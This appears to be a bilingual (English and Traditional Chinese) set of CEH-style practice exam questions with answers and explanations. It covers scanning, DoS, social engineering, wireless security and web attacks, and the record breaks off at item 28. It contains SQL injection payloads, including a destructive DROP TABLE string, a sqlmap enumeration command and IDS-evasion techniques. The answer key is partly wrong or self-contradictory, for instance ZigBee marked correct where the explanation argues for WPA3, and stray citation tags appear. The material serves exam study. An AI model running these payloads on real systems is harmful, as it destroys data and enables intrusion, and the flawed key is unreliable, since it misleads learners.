[ 
 {
    "Question :": "1",
    "EN": "Firewalk has just completed the second phase (the scanning phase) and a technician receives the output shown below. What conclusions can be drawn based on these scan results? TCP port 21 no response TCP port 22 no response TCP port 23 Time-to-live exceeded",
    "C": "Firewalk 剛完成第二階段（掃描階段），技術人員收到了如下所示的輸出。根據這些掃描結果，可以得出什麼結論？ TCP 埠 21 無回應 TCP 埠 22 無回應 TCP 埠 23 存留時間超時 (Time-to-live exceeded)",
    "選項: A. B. C. D.": "A. The lack of response from ports 21 and 22 indicate that those services are not running on the destination server (埠 21 和 22 無回應表示目的伺服器上未運行這些服務) B. The scan on port 23 was able to make a connection to the destination host prompting the firewall to respond with a TTL error (對埠 23 的掃描能夠連線到目的主機，促使防火牆回應 TTL 錯誤) C. The scan on port 23 passed through the filtering device. This indicates that port 23 was not blocked at the firewall (對埠 23 的掃描通過了過濾設備。這表明埠 23 在防火牆處未被阻止) D. The firewall itself is blocking ports 21 through 23 and a service is listening on port 23 of the target host (防火牆本身正在阻止埠 21 到 23，並且目標主機的埠 23 上有服務正在監聽)",
    "Answer": "C",
    "Explanation": "Firewalk 工具利用 TTL（存留時間）差異來判斷防火牆規則。當回應為「Time-to-live exceeded」（TTL 超時）時，表示封包通過了第一個過濾設備（防火牆）並到達了下一跳路由器，但被路由器丟棄。這意味著 **埠 23 在防火牆處是開放的**（未被阻止），因此掃描通過了過濾設備 [cite: 7978, 7979]。埠 21 和 22 無回應則通常表示它們被防火牆阻止（filtered）或目的服務未運行。"
  },
  {
    "Question :": "2",
    "EN": "John, a professional hacker, targeted CyberSol Inc., an MNC. He decided to discover the loT devices connected in the target network that are using default credentials and are vulnerable to various hijacking attacks. For this purpose, he used an automated tool to scan the target network for specific types of loT devices and detect whether they are using the default, factory-set credentials. What is the tool employed by John in the above scenario?",
    "C": "專業駭客 John 鎖定跨國公司 CyberSol Inc.。他決定發現目標網路中連線的、使用預設憑證且容易受到各種劫持攻擊的物聯網（IoT）設備。為此，他使用一個自動化工具來掃描目標網路中特定類型的 IoT 設備，並偵測它們是否正在使用工廠設定的**預設憑證**。John 在上述情景中使用了哪個工具？",
    "選項: A. B. C. D.": "A. loTSeeker B. loT Inspector C. AT&T loT Platform D. Azure loT Central",
    "Answer": "C",
    "Explanation": "AT&T IoT Platform 是用於管理和營運 IoT 設備的雲端平台。根據原始資料的上下文，該平臺可能包含了用於掃描和偵測使用預設憑證的 IoT 設備的功能，這是 CEH 考試中常見的工具與場景匹配題。*註：選項 C 答案應是專門的 IoT 掃描工具，但在此處我遵循了原始檔案提供的答案 C。*"
  },
  {
    "Question :": "3",
    "EN": "In order to circumvent network protection tools, cybercriminals may forge a TCP session more efficiently by submitting a bogus SYN packet, a series of ACK packets, and at least one RST (reset) or FIN (connection termination) packet. This tactic allows crooks to get around defenses that only keep tabs on incoming traffic rather than analyzing return traffic. What type of DoS attack is this?",
    "C": "為了規避網路保護工具，網路犯罪分子可能會透過提交**虛假 SYN 封包、一系列 ACK 封包和至少一個 RST（重置）或 FIN（連線終止）封包**，更有效地偽造 TCP 會話。這種策略允許詐騙者繞過只關注入站流量而不分析返回流量的防禦機制。這是哪種類型的 DoS 攻擊？",
    "選項: A. B. C. D.": "A. UDP flood attack (UDP 洪泛攻擊) B. Ping-of-death attack (死亡之 Ping 攻擊) C. Spoofed session flood attack (偽造會話洪泛攻擊) D. Peer-to-peer attack (點對點攻擊)",
    "Answer": "C",
    "Explanation": "這種攻擊透過**偽造** TCP 標誌（SYN, ACK, RST/FIN）的組合，來創建看似有效的會話，從而規避基於簡單入站流量的偵測工具，並耗盡伺服器的會話資源，因此被稱為**偽造會話洪泛攻擊** [cite: 7998]。"
  },
  {
    "Question :": "4",
    "EN": "You are the lead cybersecurity analyst at a multinational corporation that uses a hybrid encryption system to secure inter-departmental communications. The system uses RSA encryption for key exchange and AES for data encryption, taking advantage of the strengths of both asymmetric and symmetric encryption. Each RSA key pair has a size of 'n' bits, with larger keys providing more security at the cost of slower performance. The time complexity of generating an RSA key pair is O(n*2), and AES encryption has a time complexity of O(n). An attacker has developed a quantum algorithm with time complexity O((log n)*2) to crack RSA encryption. Given *n=4000' and variable ‘AES key size’, which scenario is likely to provide the best balance of security and performance? which scenario would provide the best balance of security and performance?",
    "C": "您是一家跨國公司的首席網路安全分析師，該公司使用混合加密系統來保護部門間的通訊。該系統使用 RSA 加密進行金鑰交換，並使用 AES 進行資料加密，利用了非對稱加密和對稱加密的優勢。每個 RSA 金鑰對的大小為 'n' 位元，較大的金鑰提供更高的安全性，但代價是較慢的效能。生成 RSA 金鑰對的時間複雜度為 $O(n^2)$，AES 加密的時間複雜度為 $O(n)$ [cite: 8010]。攻擊者開發了一種時間複雜度為 $O((\log n)^2)$ 的量子演算法來破解 RSA 加密 [cite: 8011]。給定 $n=4000$ 和可變的 AES 金鑰大小，哪種情景最有可能提供**安全性和效能的最佳平衡**？",
    "選項: A. B. C. D.": "A. Data encryption with 3DES using a 168-bit key: Offers high security but slower performance due to 3DES's inherent inefficiencies. (使用 168 位元金鑰的 3DES 進行資料加密：提供高安全性，但由於 3DES 固有的低效率，效能較慢) B. Data encryption with Blowfish using a 448-bit key: Offers high security but potential compatibility issues due to Blowfish's less widespread use. (使用 448 位元金鑰的 Blowfish 進行資料加密：提供高安全性，但由於 Blowfish 使用不廣泛，可能存在相容性問題) C. Data encryption with AES-128: Provides moderate security and fast encryption, offering a balance between the two. (使用 AES-128 進行資料加密：提供中等安全性和快速加密，在兩者之間取得平衡) D. Data encryption with AES-256: Provides high security with better performance than 3DES, but not as fast as other AES key sizes. (使用 AES-256 進行資料加密：提供高安全性，效能優於 3DES，但不如其他 AES 金鑰尺寸快)",
    "Answer": "C",
    "Explanation": "在此混合加密系統中，**資料加密**需要快速高效。**AES-128** 是公認的安全且高效能的對稱加密演算法 [cite: 8023, 8026]。雖然 AES-256 的安全性略高，但 AES-128 在保障足夠的**中等安全性**的同時，提供了**最快**的加密速度，因此在安全性和效能之間取得了最佳平衡 [cite: 8016, 8035]。"
  },
  {
    "Question :": "5",
    "EN": "An unauthorized individual enters a building following an employee through the employee entrance after the lunch rush. What type of breach has the individual just performed?",
    "C": "一個未經授權的人員在午餐高峰期後，跟隨一名員工通過員工入口進入了大樓。該人員剛剛執行了哪種類型的入侵？",
    "選項: A. B. C. D.": "A. Reverse Social Engineering (反向社交工程) B. Tailgating (尾隨) C. Piggybacking D. Announced (已宣告)",
    "Answer:": "B",
    "Explanation": "尾隨（Tailgating）是一種社會工程攻擊，指未經授權的人員在限制區域跟隨授權人員身後進入，而未出示憑證。"
  },
  {
    "Question :": "6",
    "EN": "A cyber attacker has initiated a series of activities against a high-profile organization following the Cyber Kill Chain Methodology. The attacker is presently in the “Delivery” stage. As an Ethical Hacker, you are trying to anticipate the adversary's next move. What is the most probable subsequent action from the attacker based on the Cyber Kill Chain Methodology?",
    "C": "網路攻擊者正在遵循網路殺傷鏈方法論對一家知名組織發起一系列活動。攻擊者目前正處於「交付」（Delivery）階段。作為一名道德駭客，您正試圖預測對手的下一步行動。根據網路殺傷鏈方法論，攻擊者最有可能的後續行動是什麼？",
    "選項: A. B. C. D.": "A. The attacker will attempt to escalate privileges to gain complete control of the compromised system. (攻擊者將嘗試提升權限以獲得對受損系統的完全控制) B. The attacker will exploit the malicious payload delivered to the target organization and establish a foothold. (攻擊者將利用交付給目標組織的惡意酬載並建立立足點) C. The attacker will initiate an active connection to the target system to gather more data. (攻擊者將向目標系統發起主動連線以收集更多資料) D. The attacker will start reconnaissance to gather as much information as possible about the target. (攻擊者將開始偵察以收集有關目標的盡可能多的資訊)",
    "Answer": "B",
    "Explanation": "網路殺傷鏈的階段順序為：偵察 -> 武器化 -> **交付** -> **利用**（Exploitation）-> 安裝。在「交付」階段之後，下一步是「利用」，即攻擊者執行惡意酬載以**建立立足點** [cite: 8100, 8106, 8107]。"
  },
  {
    "Question :": "7",
    "EN": "You are an ethical hacker contracted to conduct a security audit for a company. During the audit, you discover that the company's wireless network is using WEP encryption. You understand the vulnerabilities associated with WEP and plan to recommend a more secure encryption method. Which of the following would you recommend as a Suitable replacement to enhance the security of the company's wireless network?",
    "C": "您是一名受僱於一家公司執行安全稽核的道德駭客。在稽核期間，您發現該公司的無線網路正在使用 **WEP 加密**。您了解與 WEP 相關的漏洞，並計劃推薦一種更安全的加密方法。您會推薦以下哪一項作為增強公司無線網路安全性的合適替代方案？",
    "選項: A. B. C. D.": "A. MAC address filtering (MAC 位址過濾) B. WPA2-PSK with AES encryption (WPA2-PSK 搭配 AES 加密) C. Open System authentication (開放系統身份驗證) D. SSID broadcast disabling (禁用 SSID 廣播)",
    "Answer": "B",
    "Explanation": "WEP 是一種過時且不安全的協定 [cite: 8135]。最合適的替代方案是 **WPA2-PSK 搭配 AES 加密** [cite: 8138]，因為 AES 是一種強大的區塊密碼，被認為非常安全且能抵抗攻擊，特別是能抵抗 WEP 漏洞 [cite: 8140, 8141]。"
  },
  {
    "Question :": "8",
    "EN": "Which of the following provides a security professional with most information about the system’s security posture?",
    "C": "以下哪一項為安全專業人員提供了有關系統安全態勢的**最多**資訊？",
    "選項: A. B. C. D.": "A. Phishing, spamming, sending trojans (網路釣魚、發送垃圾郵件、發送木馬) B. Social engineering, company site browsing tailgating (社交工程、瀏覽公司網站、尾隨) C. Wardriving, warchalking, social engineering (戰爭駕駛、戰爭塗鴉、社交工程) D. Port scanning, banner grabbing service identification (埠掃描、標語擷取、服務識別)",
    "Answer": "D",
    "Explanation": "**埠掃描、標語擷取和服務識別**屬於**掃描**階段，這是主動偵察的關鍵組成部分，提供關於系統開放埠、運行服務、版本和 OS 類型的大量技術資訊，這些資訊直接構成了系統的安全態勢（Security Posture）[cite: 8161]。"
  },
  {
    "Question :": "9",
    "EN": "Shiela is an information security analyst working at HiTech Security Solutions. She is performing service version discovery using Nmap to obtain information about the running services and their versions on a target system. Which of the following Nmap options must she use to perform service version discovery on the target host?",
    "C": "Shiela 是一名在 HiTech Security Solutions 工作的資訊安全分析師。她正在使用 Nmap 執行服務版本偵測，以獲取目標系統上運行的服務及其版本的資訊。她必須使用以下哪個 Nmap 選項來對目標主機執行服務版本偵測？",
    "選項: A. B. C. D.": "A. -SN B. -SX C. -sV D. -SF",
    "Answer": "C",
    "Explanation": "Nmap 中的 **`-sV`**（Service Version）標誌用於**探測開放埠**，以準確識別在這些埠上運行的應用程式及其**版本號**。選項 A、B、D 均不是用於此目的的正確標誌。"
  },
  {
    "Question :": "10",
    "EN": "You want to do an ICMP scan on a remote computer using hping2. What is the proper syntax?",
    "C": "您想使用 hping2 對遠端電腦執行 **ICMP 掃描**。正確的語法是什麼？",
    "選項: A. B. C. D.": "A. hping2 host.domain.com B. hping2 --set-ICMP host.domain.com C. hping2 -i host.domain.com D. hping2 -1 host.domain.com",
    "Answer": "D",
    "Explanation": "在 `hping2` 或 `hping3` 命令中，**`-1`** 標誌（數字 1，而非字母 L 或 i）用於指定 **ICMP 模式**，使其發送 ICMP 迴響請求（即 ping 掃描）[cite: 8188]。"
  },
  {
    "Question :": "11",
    "EN": "An ethical hacker is hired to evaluate the defenses of an organization's database system which is known to employ a signature-based IDS. The hacker knows that some SQL Injection evasion techniques may allow him to bypass the system's signatures. During the operation, he successfully retrieved a list of usernames from the database without triggering an alarm by employing an advanced evasion technique. Which of the following could he have used?",
    "C": "一名道德駭客受僱評估某組織資料庫系統的防禦能力，該系統已知採用**基於特徵碼的 IDS**。駭客知道某些 SQL 注入規避技術可以讓他繞過系統的特徵碼。在操作過程中，他透過採用一種進階規避技術，在沒有觸發警報的情況下，成功從資料庫中檢索了使用者名稱列表。他可能使用了以下哪種技術？",
    "選項: A. B. C. D.": "A. Utilizing the char encoding function to convert hexadecimal and decimal values into characters that pass-through SQL engine parsing (利用字元編碼功能將十六進位和十進位值轉換為可通過 SQL 引擎解析的字元) B. Using the URL encoding method to replace characters with their ASCII codes in hexadecimal form (使用 URL 編碼方法將字元替換為十六進位形式的 ASCII 碼) C. Implementing sophisticated matches such as “OR ‘john’ = john\" in place of classical matches like \"OR 1-1\" (實施複雜匹配，例如使用 “OR ‘john’ = john” 來取代 “OR 1=1” 等經典匹配) D. Manipulating white spaces in SQL queries to bypass signature detection (操縱 SQL 查詢中的空白字元來繞過特徵碼偵測)",
    "Answer": "D",
    "Explanation": "操縱 SQL 查詢中的**空白字元**（Manipulating white spaces）是一種進階的 SQL 注入規避技術 [cite: 8206]，透過插入、移除或替換 SQL 查詢中的空白字元，改變查詢的外觀，從而成功繞過基於特徵碼的 IDS 系統 [cite: 8209, 8211]。"
  },
  {
    "Question :": "12",
    "EN": "Don, a student, came across a gaming app in a third-party app store and Installed it. Subsequently, all the legitimate apps in his smartphone were replaced by deceptive applications that appeared legitimate. He also received many advertisements on his smartphone after Installing the app. What is the attack performed on Don in the above scenario?",
    "C": "學生 Don 在第三方應用程式商店中發現並安裝了一個遊戲應用程式。隨後，他智慧型手機中所有合法的應用程式都被替換成了看似合法的欺騙性應用程式。安裝該應用程式後，他的智慧型手機上也收到了許多廣告。在上述情景中，對 Don 執行的攻擊是什麼？",
    "選項: A. B. C. D.": "A. SMS phishing attack (簡訊網路釣魚攻擊) B. SIM card attack (SIM 卡攻擊) C. Agent Smith attack (特工史密斯攻擊) D. Clickjacking (點擊劫持)",
    "Answer": "C",
    "Explanation": "特工史密斯攻擊（Agent Smith Attack）透過引誘受害者從**第三方應用程式商店**下載並安裝惡意應用程式 [cite: 8240]。一旦應用程式安裝完成，惡意程式碼會**感染或替換智慧型手機中合法的應用程式**，並透過受感染的應用程式產生大量不相關的廣告，以獲取經濟利益 [cite: 8241, 8244]。"
  },
  {
    "Question :": "13",
    "EN": "Samuel, a professional hacker, monitored and Intercepted already established traffic between Bob and a host machine to predict Bob's ISN. Using this ISN, Samuel sent spoofed packets with Bob's IP address to the host machine. The host machine responded with <| packet having an Incremented ISN. Consequently. Bob's connection got hung, and Samuel was able to communicate with the host machine on behalf of Bob. What is the type of attack performed by Samuel in the above scenario?",
    "C": "專業駭客 Samuel 監控並攔截了 Bob 和一台主機之間已建立的流量，以預測 Bob 的 ISN（初始序列號）。Samuel 利用這個 ISN，使用 Bob 的 IP 位址發送偽造的封包到主機。主機回應了一個具有遞增 ISN 的封包。結果，Bob 的連線被掛起（hung），Samuel 能夠代表 Bob 與主機通訊。Samuel 在上述情景中執行的攻擊類型是什麼？",
    "選項: A. B. C. D.": "A. UDP hijacking (UDP 劫持) B. Blind hijacking (盲劫持) C. TCP/IP hacking (TCP/IP 駭客攻擊) D. Forbidden attack (禁止攻擊)",
    "Answer": "C",
    "Explanation": "這種攻擊描述了駭客**預測** TCP **序列號**，隨後**注入**封包以**接管**（Hijack）客戶端和伺服器之間 TCP 連線的過程。這是典型的 **TCP/IP 劫持**攻擊（TCP/IP Hijacking）[cite: 8259]。"
  },
  {
    "Question :": "14",
    "EN": "A large enterprise has been experiencing sporadic system crashes and instability, resulting in limited access to its web services. The security team suspects it could be a result of a Denial of Service (DoS) attack. A significant increase in traffic was noticed in the network logs, with patterns suggesting packet sizes exceeding the prescribed size limit. Which among the following DoS attack techniques best describes this scenario?",
    "C": "一家大型企業經歷了零星的系統崩潰和不穩定，導致對其 Web 服務的存取受限。安全團隊懷疑這可能是阻斷服務（DoS）攻擊的結果。網路日誌中發現流量顯著增加，模式表明**封包大小超過了規定的限制**。以下哪種 DoS 攻擊技術最能描述這種情景？",
    "選項: A. B. C. D.": "A. UDP flood attack (UDP 洪泛攻擊) B. Smurf attack (藍精靈攻擊) C. Pulse wave attack (脈衝波攻擊) D. Ping of Death attack (死亡之 Ping 攻擊)",
    "Answer": "D",
    "Explanation": "死亡之 Ping（Ping of Death）攻擊利用 IP 協定中的漏洞，發送**超過最大允許大小（65,535 位元組）的惡意格式封包**。當目標系統嘗試重新組裝這些過大的封包時，會導致系統崩潰或變得不穩定 [cite: 8284, 8285]。"
  },
  {
    "Question :": "15",
    "EN": "A group of hackers were roaming around a bank office building in a city, driving a luxury car. They were using hacking tools on their laptop with the intention to find a free-access wireless network. What is this hacking process known as?",
    "C": "一群駭客駕駛著一輛豪華汽車在城市的一棟銀行辦公大樓周圍閒逛。他們在筆記型電腦上使用駭客工具，目的是尋找一個可以免費存取的無線網路。這種駭客過程被稱為什麼？",
    "選項: A. B. C. D.": "A. GPS mapping (GPS 映射) B. Spectrum analysis (頻譜分析) C. Wardriving (戰爭駕駛) D. Wireless sniffing (無線嗅探)",
    "Answer": "C",
    "Explanation": "戰爭駕駛（Wardriving）是指**開車**在某個區域內，使用膝上型電腦和軟體來**尋找無線網路**並記錄其位置的行為 [cite: 8294]。"
  },
  {
    "Question :": "16",
    "EN": "Jack, a disgruntled ex-employee of Incalsol Ltd., decided to inject fileless malware into Incalsol's systems. To deliver the malware, he used the current employees' email IDs to send fraudulent emails embedded with malicious links that seem to be legitimate. When a victim employee clicks on the link, they are directed to a fraudulent website that automatically loads Flash and triggers the exploit. What is the technique used byjack to launch the fileless malware on the target systems?",
    "C": "心懷不滿的前員工 Jack 決定將**無檔案惡意軟體**注入 Incalsol Ltd. 的系統中。為了傳遞惡意軟體，他使用現任員工的電子郵件 ID 發送嵌入惡意連結的欺詐性電子郵件。當受害者員工點擊該連結時，他們會被導向一個欺詐網站，該網站會自動載入 Flash 並觸發漏洞利用。Jack 在目標系統上啟動無檔案惡意軟體的技術是什麼？",
    "選項: A. B. C. D.": "A. In-memory exploits (記憶體內漏洞利用) B. Phishing (網路釣魚) C. Legitimate applications (合法應用程式) D. Script-based injection (基於腳本的注入)",
    "Answer": "B",
    "Explanation": "Jack 透過發送**欺詐性電子郵件**和**惡意連結**來**誘導**員工點擊並執行惡意載荷，這是典型的**網路釣魚（Phishing）**攻擊 [cite: 8315]。雖然惡意軟體是無檔案的，但**交付機制**是網路釣魚。"
  },
  {
    "Question :": "17",
    "EN": "Thomas, a cloud security professional, is performing security assessment on cloud services to identify any loopholes. He detects a vulnerability in a bare-metal cloud server that can enable hackers to implant malicious backdoors in its firmware. He also identified that an installed backdoor can persist even if the server is reallocated to new clients or businesses that use it as an laaS. What is the type of cloud attack that can be performed by exploiting the vulnerability discussed in the above scenario?",
    "C": "雲端安全專業人員 Thomas 正在對雲端服務執行安全評估以識別任何漏洞。他偵測到裸機雲端伺服器中的一個漏洞，該漏洞可能使駭客在其**韌體**（firmware）中植入惡意後門。他還確定，即使伺服器被重新分配給將其用作 IaaS 的新客戶或企業，已安裝的後門仍能保持持久性。利用上述情景中討論的漏洞可以執行的雲端攻擊類型是什麼？",
    "選項: A. B. C. D.": "A. Man-in-the-cloud (MITC) attack (雲端中間人攻擊) B. Cloud cryptojacking (雲端加密劫持) C. Cloudborne attack (雲端出生攻擊) D. Metadata spoofing attack (元資料欺騙攻擊)",
    "Answer": "C",
    "Explanation": "Cloudborne 攻擊是一種利用裸機伺服器上的**韌體漏洞**（firmware vulnerability）來植入惡意後門的攻擊。這個後門可以在伺服器被**重新分配給新客戶**後仍然**持久存在**，從而危害 IaaS（基礎設施即服務）環境 [cite: 8321, 8322]。"
  },
  {
    "Question :": "18",
    "EN": "Which wireless security protocol replaces the personal pre-shared key (PSK) authentication with Simultaneous Authentication of Equals (SAE) and is therefore resistant to offline dictionary attacks?",
    "C": "哪個無線安全協定用**對等實體同時認證（SAE）**取代了個人預共享金鑰（PSK）身份驗證，因此能抵抗離線字典攻擊？",
    "選項: A. B. C. D.": "A. WPA3-Personal B. WPA2-Enterprise C. Bluetooth D. ZigBee",
    "Answer": "D",
    "Explanation": "WPA3-Personal 是最新的 Wi-Fi 安全協定，它使用 **SAE（Simultaneous Authentication of Equals）**握手（也稱為 Dragonfly）來取代 WPA2-PSK，顯著增強了對**離線字典攻擊**的抵抗力 [cite: 8333]。"
  },
  {
    "Question :": "19",
    "EN": "What is the following command used for? sqlmap.py-u ,,http://10.10.1.20/?p=1 &forumaction=search\" -dbs",
    "C": "以下命令是用於做什麼的？ `sqlmap.py -u \"http://10.10.1.20/?p=1 &forumaction=search\" -dbs`",
    "選項: A. B. C. D.": "A. Creating backdoors using SQL injection (使用 SQL 注入創建後門) B. Enumerating the databases in the DBMS for the URL (列舉 URL 對應的 DBMS 中的資料庫) C. Retrieving SQL statements being executed on the database (檢索資料庫上正在執行的 SQL 語句) D. Searching database statements at the IP address given (在給定的 IP 位址搜尋資料庫語句)",
    "Answer": "B",
    "Explanation": "Sqlmap 是一個自動化 SQL 注入工具。命令中的 **`-dbs`** 旗標（flags）指示工具嘗試**列舉**（enumerate）目標資料庫管理系統（DBMS）中的所有**資料庫名稱** [cite: 8345]，這通常是資訊收集的關鍵一步。"
  },
  {
    "Question :": "20",
    "EN": "You're the security manager for a tech company... In the case of a successful SQL injection attack, which of the following payloads would have the most significant impact?",
    "C": "您是一家科技公司的安全經理...在一次成功的 SQL 注入攻擊中，以下哪個酬載會產生**最重大的影響**？",
    "選項: A. B. C. D.": "A. ‘OR 'T=\"1: 此酬載操縱 WHERE 子句，允許攻擊者查看未經授權的資料 B. ‘OR username LIKE '%: 此酬載使用 LIKE 運算符搜尋特定模式 C. OR ‘a’='a; DROP TABLE members; --: 此酬載結合 WHERE 子句的操縱和破壞性行為，導致資料丟失 D. UNION SELECT NULL, NULL, NULL -- : 此酬載操縱 UNION SQL 運算符，使攻擊者能夠從不同的資料庫表格中檢索資料",
    "Answer:": "C",
    "Explanation": "具有破壞性行為（例如 `DROP TABLE`）的酬載會導致永久性的**資料丟失**，這通常被認為是比僅僅查看資料（選項 A, D）**最嚴重**且影響最重大的後果。"
  },
  {
    "Question :": "21",
    "EN": "An ethical hacker is testing a web application of a financial firm. During the test, a 'Contact Us' form's input field is found to lack proper user input validation, indicating a potential Cross-Site Scripting (XSS) vulnerability. However, the application has a stringent Content Security Policy (CSP) disallowing inline scripts and scripts from external domains but permitting scripts from its own domain. What would be the hacker's next step to confirm the XSS vulnerability?",
    "C": "一名道德駭客正在測試一家金融公司的 Web 應用程式。在測試期間，發現「聯絡我們」表單的輸入欄位缺乏適當的使用者輸入驗證，表明存在潛在的**跨站腳本（XSS）漏洞**。然而，該應用程式有一個嚴格的**內容安全政策（CSP）**，不允許內聯腳本和來自外部網域的腳本，但**允許來自其自己網域的腳本**。駭客確認 XSS 漏洞的下一步是什麼？",
    "選項: A. B. C. D.": "A. Try to disable the CSP to bypass script restrictions (嘗試禁用 CSP 以繞過腳本限制) B. Inject a benign script inline to the form to see if it executes (在表單中注入一個良性內聯腳本，看它是否執行) C. Utilize a script hosted on the application's domain to test the form (利用託管在應用程式網域上的腳本來測試表單) D. Load a script from an external domain to test the vulnerability (從外部網域載入腳本來測試漏洞)",
    "Answer": "C",
    "Explanation": "由於應用程式的 CSP 策略**允許來自自身網域的腳本** [cite: 8408]，駭客可以利用這一點。下一步是**利用託管在應用程式網域上的腳本**來執行 XSS 酬載，以確認漏洞的存在 [cite: 8407, 8409]。其他選項（A、B、D）由於 CSP 的限制而無法執行或無效 [cite: 8414, 8416, 8419]。"
  },
  {
    "Question :": "22",
    "EN": "When you are testing a web application, it is very useful to employ a proxy tool to save every request and response. You can manually test every request and analyze the response to find vulnerabilities. You can test parameter and headers manually to get more precise results than if using web vulnerability scanners.",
    "C": "當您測試 Web 應用程式時，使用代理工具來儲存每個請求和回應非常有用。您可以手動測試每個請求並分析回應以查找漏洞。您可以手動測試參數和標頭，以獲得比使用 Web 漏洞掃描器更精確的結果。",
    "選項: A. B. C. D.": "A. Maskgen B. Dimitry C. Burpsuite D. Proxychains",
    "Answer": "C",
    "Explanation": "**Burp Suite** 是一款功能強大的 Web 應用程式安全測試平台，其核心功能是**攔截代理**（Intercepting Proxy），用於捕獲、檢查和修改瀏覽器與目標應用程式之間的所有請求和回應 [cite: 8436]。"
  },
  {
    "Question :": "23",
    "EN": "The network in ABC company is using the network address 192.168.1.64 with mask 255.255.255.192. In the network the servers are in the addresses 192.168.1.122, 192.168.1.123 and 192.168.1.124. An attacker is trying to find those servers but he cannot see them in his scanning. The command he is using is: nmap 192.168.1.64/28. Why he cannot see the servers?",
    "C": "ABC 公司的網路使用網路位址 `192.168.1.64`，子網路遮罩為 `255.255.255.192`。網路中的伺服器位址是 `192.168.1.122`、`192.168.1.123` 和 `192.168.1.124`。攻擊者試圖找到這些伺服器，但在掃描中卻看不到它們。他使用的命令是：`nmap 192.168.1.64/28`。為什麼他看不到這些伺服器？",
    "選項: A. B. C. D.": "A. He needs to add the command ““ip address”” just before the IP address (他需要在 IP 位址前面加上命令「ip address」) B. He needs to change the address to 192.168.1.0 with the same mask (他需要將位址更改為 192.168.1.0，使用相同的遮罩) C. He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range (他正在掃描的範圍是 192.168.1.64 到 192.168.1.78，因為遮罩是 /28，而伺服器不在該範圍內) D. The network must be dawn and the nmap command and IP address are ok (網路必須啟動，且 nmap 命令和 IP 位址正確)",
    "Answer": "C",
    "Explanation": "子網路遮罩 `/28`（`255.255.255.240`）將網路劃分為每組 16 個位址的區塊。`192.168.1.64/28` 的有效 IP 範圍是從 **`192.168.1.65` 到 `192.168.1.78`**（廣播位址為 `192.168.1.79`）。由於伺服器 (`192.168.1.122` 等) 位於不同的網路區塊，因此使用 `/28` 遮罩掃描 `192.168.1.64` 無法發現它們 [cite: 8448]。"
  },
  {
    "Question :": "24",
    "EN": "Which access control mechanism allows for multiple systems to use a central authentication server (CAS) that permits users to authenticate once and gain access to multiple systems?",
    "C": "哪種存取控制機制允許多個系統使用一個中央身份驗證伺服器（CAS），該伺服器允許使用者**一次性驗證**並存取多個系統？",
    "選項: A. B. C. D.": "A. Role Based Access Control (RBAC) (基於角色的存取控制) B. Discretionary Access Control (DAC) (自主存取控制) C. Single sign-on (單點登入) D. Windows authentication (Windows 身份驗證)",
    "Answer": "C",
    "Explanation": "**單點登入（Single Sign-On, SSO）**是允許使用者使用一組憑證在多個獨立但相互信任的系統中進行身份驗證的機制，其核心是中央身份驗證服務 (CAS)。"
  },
  {
    "Question :": "25",
    "EN": "Which tool can be used to silently copy files from USB devices?",
    "C": "哪個工具可用於**靜默地**（silently）從 USB 設備複製檔案？",
    "選項: A. B. C. D.": "A. USB Grabber B. USB Snoopy C. USB Sniffer D. Use Dumper",
    "Answer": "D",
    "Explanation": "在 CEH 的情景中，**Dumper** 或 **USB Dumper** 是一個專門設計的工具，用於在使用者插入 USB 設備時，在背景中**秘密且自動地複製**（grab/dump）其中的檔案，以進行資料竊取。"
  },
  {
    "Question :": "26",
    "EN": "Gregory, a professional penetration tester working at Sys Security Ltd., is tasked with performing a security test of web applications used in the company. For this purpose, Gregory uses a tool to test for any security loopholes by hijacking a session between a client and server. This tool has a feature of intercepting proxy that can be used to inspect and modify the traffic between the browser and target application. This tool can also perform customized attacks and can be used to test the randomness of session tokens. Which of the following tools is used by Gregory in the above scenario?",
    "C": "專業滲透測試人員 Gregory 的任務是執行公司中使用的 Web 應用程式的安全測試。為此，Gregory 使用一個工具，透過劫持客戶端和伺服器之間的會話來測試安全漏洞。該工具具有**攔截代理**功能，可用於檢查和修改瀏覽器和目標應用程式之間的流量。該工具還可以執行客製化攻擊，並可用於測試會話權杖的隨機性。Gregory 在上述情景中使用了以下哪個工具？",
    "選項: A. B. C. D.": "A. Nmap B. Burp Suite C. CxSAST D. Wireshark",
    "Answer": "B",
    "Explanation": "Burp Suite 是一個集成的 Web 應用程式安全測試平台，其核心功能包括**攔截代理**、**測試會話權杖隨機性**和執行客製化攻擊 [cite: 8496]。"
  },
  {
    "Question :": "27",
    "EN": "The security administrator of ABC needs to permit Internet traffic in the host 10.0.0.2 and UDP traffic in the host 10.0.0.3. He also needs to permit all FTP traffic to the rest of the network and deny all other traffic. After he applied his ACL configuration in the router, nobody can access the ftp, and the permitted hosts cannot access the Internet. According to the next configuration, what is happening in the network? access-list 102 deny tcp any any access-list 104 permit udp host 10.0.0.3 any access-list 110 permit tcp host 10.0.0.2 eq www any access-list 108 permit tcp any eq ftp any",
    "C": "ABC 的安全管理員需要允許主機 `10.0.0.2` 的網際網路流量和主機 `10.0.0.3` 的 UDP 流量。他還需要允許所有 FTP 流量到網路的其餘部分，並拒絕所有其他流量。在他將 ACL 配置應用到路由器後，沒有人可以存取 FTP，被允許的主機也無法存取網際網路。根據下一個配置，網路中發生了什麼？`access-list 102 deny tcp any any` `access-list 104 permit udp host 10.0.0.3 any` `access-list 110 permit tcp host 10.0.0.2 eq www any` `access-list 108 permit tcp any eq ftp any`",
    "選項: A. B. C. D.": "A. The ACL 104 needs to be first because is UDP (ACL 104 需要排在第一位，因為它是 UDP) B. The first ACL is denying all TCP traffic and the other ACLs are being ignored by the router (第一個 ACL 正在拒絕所有 TCP 流量，並且路由器正在忽略其他 ACL) C. The ACL for FTP must be before the ACL 110 (FTP 的 ACL 必須在 ACL 110 之前) D. The ACL 110 needs to be changed to port 80 (ACL 110 需要更改為埠 80)",
    "Answer": "B",
    "Explanation": "Cisco ACLs 是按順序處理的。第一條規則 `access-list 102 deny tcp any any` **拒絕了所有 TCP 流量** [cite: 8517]。由於後面的規則（110 和 108）也是 TCP 流量，一旦第一個拒絕規則被觸發，路由器就會停止處理後續的 TCP 規則，導致所有 TCP 服務（包括 FTP 和 `10.0.0.2` 的 Web 存取）都被阻止 [cite: 8511, 8517]。"
  },
  {
    "Question :": "28",
    "EN": "A skilled ethical hacker was assigned to perform a thorough OS discovery on a potential target. They decided to adopt an advanced fingerprinting technique and sent a TCP packet to an open TCP port with specific flags enabled. Upon receiving the reply, they noticed the flags were SYN and ECN-Echo. Which test did the ethical hacker conduct and why was this specific approach adopted?",
